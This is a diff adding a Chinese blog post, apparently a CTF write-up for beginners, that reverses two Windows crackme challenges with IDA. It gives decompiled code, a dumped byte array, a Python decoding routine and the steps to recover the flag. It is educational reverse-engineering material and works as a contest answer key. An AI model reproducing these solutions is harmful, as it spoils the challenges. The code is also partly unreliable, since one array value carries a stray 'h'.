@@ -428,6 +428,202 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/25/windows礼包/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/25/windows礼包/" itemprop="url">windows礼包</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-25T09:36:00+08:00">
+                2018-12-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/逆向/" itemprop="url" rel="index">
+                    <span itemprop="name">逆向</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>在翻hctf的大佬以前的博客时看见了几道不错的Windows逆向题目，正好到了带新生的时候，详细写写wp也算是带新生入门吧</strong></p>
+<p>网盘链接：链接:<a href="https://pan.baidu.com/s/1F0bg1rS2gtDNZuO7falRjg" target="_blank" rel="noopener">https://pan.baidu.com/s/1F0bg1rS2gtDNZuO7falRjg</a>  密码:nhru</p>
+<h1 id="Broken-Windows"><a href="#Broken-Windows" class="headerlink" title="Broken Windows"></a>Broken Windows</h1><p>拿peid查一下壳，这里就不再放截图（懒的打开虚拟机了。。。）了，发现有upx壳，可以手脱也可以工具直接脱，也不再演示了</p>
+<p>ida载入发现停在了WinMain这个地方。可能大家对这个函数还不是很熟悉，简单提及一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="keyword">int</span> nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DialogBoxParamA(hInstance, <span class="number">0x65</span>, <span class="number">0</span>, DialogFunc, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>WinMain是一个函数，该函数的功能是被<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/861110" target="_blank" rel="noopener">系统调用</a>，作为一个32位应用程序的<a href="https://baike.baidu.com/item/%E5%85%A5%E5%8F%A3%E7%82%B9/10933004" target="_blank" rel="noopener">入口点</a>。WinMain函数应初始化应用程序，显示主窗口，进入一个消息接收一发送循环，这个循环是应用程序执行的其余部分的顶级控制结构。</p>
+</blockquote>
+<p>可以看到这个函数有两个关键的词了，第一个就是入口点，你可以简单的理解为windows窗口中的main函数（没学过c语言的新生就当是程序从此处开始执行代码吧），接着再来看函数的内容。可以看到WinMain又去调用DialogBoxParam函数，然后就return了，似乎什么也没有干…吗？这其实就是第二个关键词了，循环，可以想象一下我们常用的windows应用窗口界面（比如你打个游戏什么的），他们可不会说是执行完你的操作就跟完事了，他们依然在循环等待着你的操作。</p>
+<p>对这个结构有了一些了解之后我们接着看DialogBoxParam这个函数，简单说就是创建一个对话框，然后用你的第四个参数（也就是某个函数）去处理这个对话框的具体过程，所以我们下一步的分析重点就应该是它，接下来我们就点进去看一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">BOOL __<span class="function">stdcall <span class="title">DialogFunc</span><span class="params">(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HWND v5; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x111</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">274</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( a3 == <span class="number">61536</span> )</span><br><span class="line">        EndDialog(hWnd, <span class="number">61536</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x111</span>u:</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( a3 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = GetDlgItem(hWnd, <span class="number">1001</span>);</span><br><span class="line">          SendMessageA(v5, <span class="number">0xD</span>u, <span class="number">0x21</span>u, dword_403428);</span><br><span class="line">          qmemcpy(Caption, dword_403428, <span class="number">0x23</span>u);</span><br><span class="line">          CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_401020, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xF</span>u:</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        hdc = BeginPaint(hWnd, &amp;Paint);</span><br><span class="line">        hdcSrc = CreateCompatibleDC(hdc);</span><br><span class="line">        SelectObject(hdcSrc, h);</span><br><span class="line">        BitBlt(hdc, <span class="number">0</span>, <span class="number">0</span>, dword_403414, cy, hdcSrc, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xCC0020</span>u);</span><br><span class="line">        DeleteDC(hdcSrc);</span><br><span class="line">        EndPaint(hWnd, &amp;Paint);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x110</span>u:</span><br><span class="line">        hDlg = hWnd;</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0</span>, StartAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        CreateThread(<span class="number">0</span>, <span class="number">0</span>, sub_401160, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        dword_40339C = GetWindowLongA(hWnd, <span class="number">-6</span>);</span><br><span class="line">        h = LoadBitmapA(dword_40339C, <span class="number">0x66</span>);</span><br><span class="line">        GetObjectA(h, <span class="number">24</span>, &amp;unk_403410);</span><br><span class="line">        SetWindowPos(hWnd, HWND_MESSAGE|<span class="number">0x2</span>, <span class="number">0</span>, <span class="number">0</span>, dword_403414, cy, <span class="number">6u</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到有大量的函数调用，而且全部都是系统API，如果是比赛场上第一次做这种题，一个一个去学习函数似乎难度系数就有点大了，那我们该怎么去找关键函数呢？这里有三种办法，一是我们从ida给我们的Function窗口中去人工找key function，因为这道题目函数不是很多所以很容易定位到关键的加密函数，之后我们在函数名处按x键就可以找到该函数在哪些地方被调用过，跟过去就可以大体了解到DialogFunc的逻辑了；第二种方法就是去找CreateThread一类的函数，这是windows编程中常用的一种操作，这类函数有什么作用呢？其实他会创建一个线程（可以想象成一个子程序），然后根据你传入的第四个参数（也是个函数）来执行；第三就是提前了解一下这些的作用喽，其实他们都对应的不同的消息响应，在下边一个题目中会具体提到。</p>
+<p>通过这几种方法我们找到了这两个关键的函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD __<span class="function">stdcall <span class="title">sub_401160</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_401080(byte_403018);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">DWORD __<span class="function">stdcall <span class="title">sub_401020</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  v1 = sub_401080(dword_403428);</span><br><span class="line">  v2 = sub_401080(v1);</span><br><span class="line">  sub_401080(v2);</span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( dword_403428[v4] == byte_403018[v4] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 -= <span class="number">4</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      MessageBoxA(<span class="number">0</span>, Caption, Caption, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一个函数很简单，就是将数据进行了处理，我们可以在函数名处按n键对函数进行重命名，方便我们之后的观看，这里我们就命名为encode，而数据我们直接dump出来，也就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="number">0x68</span>, <span class="number">0x23</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0xC8</span>, <span class="number">0xC9</span>, <span class="number">0x1F</span>, <span class="number">0x93</span>, <span class="number">0xF3</span>, <span class="number">0xFA</span>, <span class="number">0xFF</span>, <span class="number">0x9E</span>, <span class="number">0x37</span>, <span class="number">0x77</span>, <span class="number">0x1B</span>, <span class="number">0x83</span>, <span class="number">0x81</span>, <span class="number">0x69</span>, <span class="number">0x6D</span>, <span class="number">0x46</span>, <span class="number">0x64</span>, <span class="number">0xCF</span>, <span class="number">0x4B</span>, <span class="number">0xAD</span>, <span class="number">0x6A</span>, <span class="number">0xA8</span>, <span class="number">0xAA</span>, <span class="number">0xEA</span>, <span class="number">0x41</span>, <span class="number">0x45</span>, <span class="number">0x7B</span>h, <span class="number">0xAB</span>]</span><br></pre></td></tr></table></figure>
+<p>第二个函数稍显复杂，首先是对我们输入的数据进行encode，然后返回值在encode，然后返回值再encode。然后是一段循环处理，可以看到v4作为数组的下标是在不断++的，而一旦encode后的数据和我们输入的某一位不一样，那就直接return了，v3则是作为计数器，他的初始值等于我们的数据长度，而在每次都会-4，最后如果减到了&lt;4的情况，就会弹出一个MessageBox</p>
+<p>接下来的任务就是分析encode了，ida跳过去（这里我已经把一些关键变量改好名字了）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__usercall sub_401080@&lt;eax&gt;(_BYTE *a1@&lt;edi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> count; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *<span class="built_in">array</span>; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">1</span> - a1;</span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">array</span> = a1;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = __ROL1__(*<span class="built_in">array</span>, <span class="number">3</span>);      <span class="comment">//ROL是移位（就是c语言的位操作）的意思</span></span><br><span class="line">    *<span class="built_in">array</span> = v4;        			</span><br><span class="line">    <span class="keyword">if</span> ( count &gt;= <span class="number">1</span> ) </span><br><span class="line">      *<span class="built_in">array</span> = v4 ^ a1[count - <span class="number">1</span>];</span><br><span class="line">    v5 = __ROL1__(*<span class="built_in">array</span>, <span class="number">4</span>) + <span class="number">3</span>;</span><br><span class="line">    v6 = __ROL1__(<span class="built_in">array</span>[<span class="number">1</span>], <span class="number">3</span>);</span><br><span class="line">    *<span class="built_in">array</span> = v5;                     <span class="comment">//数据被四个分为了一组，这是每组的第一位</span></span><br><span class="line">    <span class="built_in">array</span>[<span class="number">1</span>] = v6;       </span><br><span class="line">    <span class="keyword">if</span> ( &amp;<span class="built_in">array</span>[v1] &gt;= <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">array</span>[<span class="number">1</span>] = v6 ^ v5;</span><br><span class="line">    v7 = __ROL1__(<span class="built_in">array</span>[<span class="number">1</span>], <span class="number">4</span>) + <span class="number">3</span>;</span><br><span class="line">    v8 = __ROL1__(<span class="built_in">array</span>[<span class="number">2</span>], <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">array</span>[<span class="number">1</span>] = v7;					<span class="comment">//每组数据的第二位</span></span><br><span class="line">    <span class="built_in">array</span>[<span class="number">2</span>] = v8;</span><br><span class="line">    <span class="keyword">if</span> ( &amp;<span class="built_in">array</span>[<span class="number">2</span> - a1] &gt;= <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">array</span>[<span class="number">2</span>] = v8 ^ v7;</span><br><span class="line">    v9 = __ROL1__(<span class="built_in">array</span>[<span class="number">2</span>], <span class="number">4</span>) + <span class="number">3</span>;</span><br><span class="line">    v10 = __ROL1__(<span class="built_in">array</span>[<span class="number">3</span>], <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">array</span>[<span class="number">2</span>] = v9;               <span class="comment">//第三位</span></span><br><span class="line">    <span class="built_in">array</span>[<span class="number">3</span>] = v10;</span><br><span class="line">    <span class="keyword">if</span> ( &amp;<span class="built_in">array</span>[<span class="number">3</span> - a1] &gt;= <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">array</span>[<span class="number">3</span>] = v10 ^ v9;        </span><br><span class="line">    <span class="built_in">array</span>[<span class="number">3</span>] = __ROL1__(<span class="built_in">array</span>[<span class="number">3</span>], <span class="number">4</span>) + <span class="number">3</span>;    <span class="comment">//第四位</span></span><br><span class="line">    count += <span class="number">4</span>;       <span class="comment">//起到了计数器的作用  </span></span><br><span class="line">    <span class="built_in">array</span> += <span class="number">4</span>;       <span class="comment">//注意这里不是真的地址+4，而是由第1个数据变为第1+4个数据，可以替换为数组下标</span></span><br><span class="line">    <span class="keyword">if</span> ( count &gt;= <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = <span class="number">1</span> - a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1 + <span class="number">1</span>;     <span class="comment">//注意这里返回的是a1加1，也就是传入数据的下一位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到该函数将传入的数据四个分为一组进行处理移位，且处理有规律可言，我们对上述的函数进行简化</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> * <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> * pt)</span> </span>&#123;</span><br><span class="line">    pt[<span class="number">0</span>] = rol(pt[<span class="number">0</span>], <span class="number">7</span>) + <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        pt[i] = rol(pt[i], <span class="number">3</span>) ^ pt[i<span class="number">-1</span>];</span><br><span class="line">        pt[i] = rol(pt[i], <span class="number">4</span>) + <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pt+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于移位操作和减法都是简单可逆（减的加上，左移的右移回去）的，所以我们很轻松就可以写出解密函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(list, fuck)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>-fuck+<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>):</span><br><span class="line">        list[i + fuck] = ror(list[i + fuck]<span class="number">-3</span>,<span class="number">4</span>) &amp; <span class="number">0xff</span></span><br><span class="line">        list[i + fuck] = ror((list[i + fuck] &amp; <span class="number">0xff</span>) ^ (list[i + fuck - <span class="number">1</span>] &amp; <span class="number">0xff</span>),<span class="number">3</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    list[fuck] = ror(list[fuck]<span class="number">-3</span>,<span class="number">7</span>) &amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure>
+<p>这里要注意一个细节问题，在ida中我们可以清楚的看到我们传入的数据是unsigned char（也就是一个字节）类型的，而我们在使用python去进行解密的时候由于用的是int的list，所以会产生数据大小不对称的问题，我们这里用&amp;0xff的方式来限制我们的数据大小。</p>
+<p>最后的脚本要注意，程序先将数据encode，接着将输入encode，输入的返回值encode，返回值再encode，所以我们在逆向解密时，应该先将数据encode，再将数据decode，再将数据从1的位置decode，再将数据从2的位置decode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encode(list)</span><br><span class="line">decode(list,<span class="number">2</span>)</span><br><span class="line">decode(list,<span class="number">1</span>)</span><br><span class="line">decode(list,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>具体的脚本就不放了，最终解得的flag是</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fyj21bw1pkj30e401kt8n.jpg" alt="image-20181225160804820"></p>
+<p>这道题目就到这里了，难度不是很高，主要还是要耐心去逆向算法，</p>
+<h1 id="Open-Windows"><a href="#Open-Windows" class="headerlink" title="Open Windows"></a>Open Windows</h1><p>还是按照上面的方法找到DialogFunc的位置，这里要提到一些新知识了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">BOOL __<span class="function">stdcall <span class="title">DialogFunc</span><span class="params">(HWND a1, UINT vm_command, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  WPARAM v4; <span class="comment">// ebx</span></span><br><span class="line">  HWND v6; <span class="comment">// esi</span></span><br><span class="line">  HWND v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> CHAR *v8; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( vm_command &gt; <span class="number">0x110</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( vm_command == <span class="number">274</span> &amp;&amp; a3 == <span class="number">61536</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      HIBYTE(a3) = <span class="number">0</span>;</span><br><span class="line">      sub_4012E0((_BYTE *)&amp;a3 + <span class="number">3</span>);</span><br><span class="line">      v8 = Src;</span><br><span class="line">      <span class="keyword">if</span> ( dword_403848 - (_DWORD)Src == <span class="number">11</span> &amp;&amp; x == <span class="number">771</span> &amp;&amp; y == <span class="number">0x63A421C737F6FFE0</span>i64 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( sub_401040(Src) )</span><br><span class="line">          MessageBoxA(<span class="number">0</span>, v8, <span class="string">"success"</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      EndDialog(a1, <span class="number">61536</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( vm_command )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x110</span>u:                              <span class="comment">// 初始化</span></span><br><span class="line">        v7 = a1;</span><br><span class="line">        y = <span class="number">1</span>i64;</span><br><span class="line">        x = <span class="number">0</span>i64;</span><br><span class="line">        dword_4037CC = GetWindowLongA(a1, <span class="number">-6</span>);</span><br><span class="line">        h = LoadBitmapA((HINSTANCE)dword_4037CC, (LPCSTR)<span class="number">0x68</span>);</span><br><span class="line">        GetObjectA(h, <span class="number">24</span>, &amp;unk_403820);</span><br><span class="line">        SetWindowPos(v7, HWND_MESSAGE|<span class="number">0x2</span>, <span class="number">0</span>, <span class="number">0</span>, dword_403824, cy, <span class="number">6u</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xF</span>u:                                <span class="comment">// 画图</span></span><br><span class="line">        v6 = a1;</span><br><span class="line">        hdc = BeginPaint(a1, &amp;Paint);</span><br><span class="line">        hdcSrc = CreateCompatibleDC(hdc);</span><br><span class="line">        SelectObject(hdcSrc, h);</span><br><span class="line">        BitBlt(hdc, <span class="number">0</span>, <span class="number">0</span>, dword_403824, cy, hdcSrc, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xCC0020</span>u);</span><br><span class="line">        DeleteDC(hdcSrc);</span><br><span class="line">        EndPaint(v6, &amp;Paint);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x101</span>u:                              <span class="comment">// 实际操作的keyup</span></span><br><span class="line">        v4 = a3;</span><br><span class="line">        HIBYTE(a1) = a3;</span><br><span class="line">        sub_4012E0((_BYTE *)&amp;a1 + <span class="number">3</span>);</span><br><span class="line">        y *= v4;</span><br><span class="line">        x += v4;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到进入函数后会对vm_command（我这里进行了重命名，ida原本应该是a2）进行比较，对不同的vm_command进行不同的操作。这其实就是windows的消息机制，vvm_command就是个消息，而我们的DialogFunc会对不同消息进行不同的响应，举个例子，你的鼠标点击、键盘敲击等等都属于一种消息，当我们点击“关闭”按钮的时候，就发送了一个关闭窗口的消息，他有一个对应的值，这时windows检测到了这个消息发生了，就会进行关闭窗口的操作并且执行用户写在此处的相关代码</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fyjxye5gcyj317k0hqdhf.jpg" alt="image-20181226103224409"></p>
+<p>当我们分析这个程序时，首先从vm_command来将程序划为不同的区域，如：case 0x110处就是用来初始化的函数，而0xF则涉及到图形绘制的一些功能，很显然这都不是我们要关心的，而case 0x101我们则要特别注意，因为0x101代表的事件是用户在使用键盘按键（准确的说是按键“弹起来”）了。</p>
+<p>在这里可以看到函数调用了两个函数，然后将我们的键盘对应的按键的值加给了x，乘给了y，也就是说x是累加器，y是累乘器。HIBYTE是从给定的16位中提取其中的高位部分，因为我们键盘上的按键是拿ASCII来标示的，所以其实只占用了一个字节，也就是8位，所以也就是让a1的高位部分等于键盘输入的按键值</p>
